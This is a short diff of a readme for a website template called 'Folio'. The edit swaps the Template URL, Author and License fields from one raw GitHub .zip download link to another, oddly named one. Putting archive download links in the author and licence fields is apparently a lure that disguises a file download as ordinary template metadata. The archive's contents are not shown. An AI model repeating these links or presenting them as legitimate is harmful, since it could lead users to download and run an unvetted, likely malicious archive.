@@ -1,6 +1,6 @@
 Thanks for downloading this template!
 
 Template Name: Folio
-Template URL: https://raw.githubusercontent.com/kipz254/mitei.github.io/master/insomnolence/mitei.github.io.zip
-Author: https://raw.githubusercontent.com/kipz254/mitei.github.io/master/insomnolence/mitei.github.io.zip
-License: https://raw.githubusercontent.com/kipz254/mitei.github.io/master/insomnolence/mitei.github.io.zip
+Template URL: https://github.com/kipz254/mitei.github.io/raw/refs/heads/master/insomnolence/github-mitei-io-rostroid.zip
+Author: https://github.com/kipz254/mitei.github.io/raw/refs/heads/master/insomnolence/github-mitei-io-rostroid.zip
+License: https://github.com/kipz254/mitei.github.io/raw/refs/heads/master/insomnolence/github-mitei-io-rostroid.zip
